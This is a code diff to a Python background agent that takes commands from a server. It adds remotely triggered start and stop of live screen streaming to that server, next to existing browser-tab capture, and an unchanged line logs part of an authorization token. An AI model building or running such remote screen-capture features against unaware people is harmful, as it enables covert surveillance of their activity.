@@ -27,6 +27,7 @@ class BackgroundService:
         self.api = APIClient()
         self.running = True
         self.screen_lock = screen_lock if screen_lock else threading.Lock()
+        self.streamer = None
         logger.info(f"BackgroundService initialized for user: {self.api.headers.get('Authorization')[:15]}...")
 
     def start(self):
@@ -102,6 +103,10 @@ class BackgroundService:
                 self.get_browser_status(command_id)
             elif command_type == "SEND_NOTIFICATION":
                 self.show_notification(cmd.get("payload", {}))
+            elif command_type == "START_LIVE_STREAM":
+                self.start_live_stream()
+            elif command_type == "STOP_LIVE_STREAM":
+                self.stop_live_stream()
             
             # ACK Command
             self.api.ack_command(command_id, "EXECUTED")
@@ -169,6 +174,33 @@ class BackgroundService:
             logger.debug(f"Result: {resp.status_code}")
         except Exception as e:
             logger.error(f"App upload failed: {e}")
+
+    def start_live_stream(self):
+        """Starts the screen streamer if not already running."""
+        if self.streamer and self.streamer.running:
+            logger.info("Streamer already running.")
+            return
+
+        try:
+            token = Config.load_token()
+            if not token:
+                logger.error("No token found for streamer.")
+                return
+                
+            from streamer import start_stream_service
+            self.streamer = start_stream_service(Config.API_BASE_URL, token, self.screen_lock)
+            logger.info("Screen streamer service started via command.")
+        except Exception as e:
+            logger.error(f"Failed to start streamer: {e}")
+
+    def stop_live_stream(self):
+        """Stops the screen streamer."""
+        if self.streamer:
+            self.streamer.stop()
+            self.streamer = None
+            logger.info("Screen streamer service stopped via command.")
+        else:
+            logger.info("No streamer active to stop.")
 
     def get_browser_status(self, command_id):
         """Captures browser status and tab details."""
